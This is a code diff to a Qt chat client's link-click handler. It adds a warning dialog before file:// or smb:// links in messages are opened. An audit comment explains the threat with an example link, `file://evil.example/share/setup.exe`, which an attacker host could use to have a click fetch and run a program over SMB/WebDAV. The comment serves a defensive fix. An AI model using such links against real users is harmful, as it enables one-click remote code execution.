@@ -26,10 +26,12 @@
 #include <QDesktopServices>
 #include <QFontMetrics>
 #include <QGraphicsSceneMouseEvent>
+#include <QMessageBox>
 #include <QPainter>
 #include <QPalette>
 #include <QTextBlock>
 #include <QTextFragment>
+#include <QUrl>
 
 Text::Text(DocumentCache& documentCache_, Settings& settings_, Style& style_,
     const QColor& custom, const QString& txt, const QFont& font, bool enableElide,
@@ -286,9 +288,37 @@ void Text::mouseReleaseEvent(QGraphicsSceneMouseEvent* event)
 
     QString anchor = doc->documentLayout()->anchorAt(event->pos());
 
+    if (anchor.isEmpty())
+        return;
+
+    // KHANDAQ (audit 2026-08-20): a chat message is attacker-controlled text, and the formatter
+    // linkifies file:// and smb:// (textformatter.cpp), so a contact or any member of a group could
+    // put a one-click launcher in the chat log. `file://evil.example/share/setup.exe` becomes the
+    // UNC path //evil.example/share/setup.exe, which ShellExecute happily fetches over SMB/WebDAV
+    // and runs — no prior file transfer needed, and nothing here asked the user anything. Files
+    // written by Khandaq get no Mark-of-the-Web either, so the OS raises no warning of its own.
+    //
+    // The product already treats exactly this action as needing consent everywhere else: opening a
+    // received file through the transfer widget goes through MessageBoxManager::confirmExecutableOpen,
+    // and Android shows a URL confirmation dialog for every link tapped in a message. This is the
+    // one path that did not ask. It asks now, and it shows the full target, because the whole risk
+    // is that the target is not what the sentence around it implies.
+    const QUrl url(anchor);
+    const QString scheme = url.scheme().toLower();
+    if (scheme == QStringLiteral("file") || scheme == QStringLiteral("smb")) {
+        const QMessageBox::StandardButton answer = QMessageBox::warning(
+            nullptr, tr("Open a local or network file?", "popup title"),
+            tr("This link opens a file on your computer or network:\n\n%1\n\n"
+               "Opening it can run a program on your computer. Links in messages come from other "
+               "people. Open it anyway?", "popup text")
+                .arg(url.toString()),
+            QMessageBox::Yes | QMessageBox::No, QMessageBox::No);
+        if (answer != QMessageBox::Yes)
+            return;
+    }
+
     // open anchor in browser
-    if (!anchor.isEmpty())
-        QDesktopServices::openUrl(anchor);
+    QDesktopServices::openUrl(url);
 }
 
 void Text::hoverMoveEvent(QGraphicsSceneHoverEvent* event)
